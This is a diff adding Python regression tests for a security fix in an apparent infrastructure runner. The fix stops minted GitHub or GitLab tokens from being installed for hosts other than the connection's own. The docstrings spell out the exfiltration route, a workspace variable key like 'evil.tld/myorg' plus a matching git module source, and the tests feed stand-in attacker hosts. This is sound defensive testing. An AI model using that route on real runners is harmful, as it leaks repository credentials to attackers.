@@ -1021,3 +1021,97 @@ class TestARefusalAtTheCloneCostsOneWorkspaceNotTheCycle:
             "repository refused by the allowlist would abort the poll cycle for every "
             "other workspace too:\n  " + "\n  ".join(unwrapped)
         )
+
+
+class TestACredentialIsOnlyEverInstalledForItsOwnConnectionsHost:
+    """A minted credential's scope comes from a workspace variable's key, which any
+    principal able to write a workspace variable chooses. `_scope_repo_form` discards
+    the scope's first segment as "the host" and nothing compared it to anything, so a
+    connection restricted to `myorg/*` accepted the key `evil.tld/myorg`.
+
+    The runner then writes `[credential "https://evil.tld/myorg"]` with the
+    connection's GitHub App installation token, and a module source of
+    `git::https://evil.tld/myorg/x.git` in the workspace's own configuration sends that
+    token — `contents: read` across the whole installation — to a host the attacker
+    picked. The mint path deliberately skips `may_reference_connection` for the
+    workspace's own connection, so this needs no claim on the connection at all.
+
+    This is a DIFFERENT invariant from the allowlist, and stronger: the allowlist is
+    opt-in and says which repositories, this says whose server. There is no
+    configuration in which a token minted from one provider account should be handed
+    to another host, so it is enforced whether or not an allowlist is set.
+    """
+
+    @staticmethod
+    def _conn(patterns, provider="github", server_url=""):
+        return VCSConnection(
+            id=uuid.uuid4(),
+            provider=provider,
+            server_url=server_url,
+            allowed_repositories=patterns,
+        )
+
+    def test_the_connections_own_host_is_accepted(self):
+        assert rbac.credential_scope_allowed(self._conn(["myorg/*"]), "github.com/myorg") is True
+
+    def test_a_scheme_on_the_key_is_tolerated(self):
+        assert (
+            rbac.credential_scope_allowed(self._conn(["myorg/*"]), "https://github.com/myorg")
+            is True
+        )
+
+    def test_another_host_is_refused_even_though_the_path_matches(self):
+        """The finding. The path satisfies `myorg/*` in every one of these."""
+        for scope in (
+            "attacker.example.com/myorg",
+            "evil.tld/myorg/anything",
+            "https://exfil.example/myorg",
+            "u@evil.tld:8443/myorg",
+        ):
+            assert rbac.credential_scope_allowed(self._conn(["myorg/*"]), scope) is False, scope
+
+    def test_an_empty_allowlist_does_not_mean_any_host(self):
+        """The case that matters most, because it is every deployment that has not
+        opted in: the exfiltration does not need an allowlist to exist."""
+        conn = self._conn([])
+        assert rbac.credential_scope_allowed(conn, "evil.tld/myorg") is False
+        assert rbac.credential_scope_allowed(conn, "github.com/myorg") is True
+
+    def test_a_github_enterprise_host_is_derived_from_the_api_url(self):
+        """`server_url` is the API base for GitHub, so the default has to map to
+        `github.com` while a GHE value passes through."""
+        ghe = self._conn(["myorg/*"], server_url="https://ghe.example.com/api/v3")
+        assert rbac.connection_git_host(ghe) == "ghe.example.com"
+        assert rbac.credential_scope_allowed(ghe, "ghe.example.com/myorg") is True
+        assert rbac.credential_scope_allowed(ghe, "github.com/myorg") is False
+
+    def test_the_github_default_maps_api_github_com_to_github_com(self):
+        assert rbac.connection_git_host(self._conn([])) == "github.com"
+        assert (
+            rbac.connection_git_host(self._conn([], server_url="https://api.github.com"))
+            == "github.com"
+        )
+
+    def test_a_gitlab_server_url_is_the_git_host_directly(self):
+        assert rbac.connection_git_host(self._conn([], provider="gitlab")) == "gitlab.com"
+        sh = self._conn(["grp/*"], provider="gitlab", server_url="https://gitlab.example.com")
+        assert rbac.connection_git_host(sh) == "gitlab.example.com"
+        assert rbac.credential_scope_allowed(sh, "gitlab.example.com/grp") is True
+        assert rbac.credential_scope_allowed(sh, "gitlab.com/grp") is False
+
+    def test_a_key_with_no_host_at_all_is_refused(self):
+        """`myorg` names no host, so it cannot be shown to name the right one."""
+        assert rbac.credential_scope_allowed(self._conn([]), "") is False
+
+    def test_an_unresolvable_connection_host_fails_closed(self):
+        conn = self._conn([], provider="gitlab", server_url="not a url at all")
+        assert rbac.credential_scope_host_allowed(conn, "github.com/myorg") is False
+
+    def test_the_refusal_names_the_host_and_not_the_allowlist(self):
+        """An operator told "this repository is not allowed" would go and widen the
+        allowlist, which would not help and would weaken the connection."""
+        cid = uuid.uuid4()
+        detail = rbac.credential_scope_host_refusal_detail(cid, "evil.tld/myorg", "github.com")
+        assert "evil.tld" in detail and "github.com" in detail
+        assert f"vcs-{cid}" in detail
+        assert "allowed-repositories" not in detail
